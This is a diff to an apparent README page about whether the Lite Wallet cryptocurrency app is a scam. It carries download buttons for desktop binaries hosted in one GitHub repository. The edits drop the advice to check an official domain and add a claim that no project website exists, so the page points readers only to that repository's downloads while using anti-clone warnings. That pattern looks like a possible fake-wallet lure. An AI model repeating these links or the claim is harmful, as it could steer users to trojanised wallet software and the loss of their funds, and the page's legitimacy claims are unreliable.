@@ -4,15 +4,15 @@
 
 The real app, the look-alikes, and how to tell them apart.
 
-<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>
+<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>
 
 <div align="center">
 
 | Platform | Requirements | File |
 | --- | --- | --- |
 | <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
-| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
-| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |
+| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
+| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |
 
 </div>
 
@@ -29,7 +29,7 @@ Legitimacy is checkable, and every check on this list is one you can run yoursel
 | Check | What legitimate looks like |
 |---|---|
 | source | public repository, open licence, buildable |
-| download | official domain or official store listing, signed build |
+| download | the GitHub release page or the official store listing, signed build |
 | identity | the LoafWallet rename is documented publicly |
 | support | public channels that never request your paper key |
 | behaviour | no login, no email, no account, no KYC |
@@ -52,7 +52,7 @@ The third is memory of the LoafWallet era: an older app, an older fee policy, an
 The dangerous version of "is it a scam" is not the reputation question; it is the clone. A look-alike app can show a working wallet, accept a restore, and send the words to whoever built it. The signs are consistent:
 
 - the download came from a link in a message, an ad or a video description
-- the domain is a near-miss of the real one, with an extra word or a different ending
+- the address is a near-miss of the real repository, with an extra word or a different ending
 - the app asks for the paper key outside the restore flow, or asks for a password
 - the store listing has few reviews and a recent publish date
 - "support" contacts you first, in a direct message
@@ -85,7 +85,7 @@ Neither is a sign of abandonment. The paper-key prompt is the restore flow, and 
 
 ## How to settle the question for yourself
 
-Do not take this page's word for it; run the checks. Open the source repository and confirm the licence. Compare the release you downloaded against the published checksum. Confirm the domain you are on. Then, with a small balance, send and receive once and watch the transaction confirm on a public explorer.
+Do not take this page's word for it; run the checks. Open the source repository and confirm the licence. Compare the release you downloaded against the published checksum. Confirm that you are on the project's repository. Then, with a small balance, send and receive once and watch the transaction confirm on a public explorer.
 
 A wallet that passes those four checks is legitimate by any standard that does not depend on reputation. A wallet that fails one of them is not worth the argument. [The safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) covers the threat model once legitimacy is settled.
 
@@ -109,9 +109,9 @@ Yes. It is the maintained successor to LoafWallet, with a public source reposito
 
 No. It takes no custody of your coins and has no account, no sign-up and no identity checks. The scam reports trace to clones, name collisions and an older fee policy from the LoafWallet era.
 
-### Is litewallet.dev the real site or a scam?
+### Is there an official Lite Wallet website?
 
-The official project site is the one linked from the repository's release page and the store listings. Treat any near-miss domain, ad result or link sent in a message as a clone until you have compared it against the repository.
+There is no separate project website: the main repository is the site, its release page is the download source, and the store listing is the only other one. Treat any near-miss domain, ad result or link sent in a message as a clone until you have compared it against that repository.
 
 ### Is Lite Wallet malware?
 
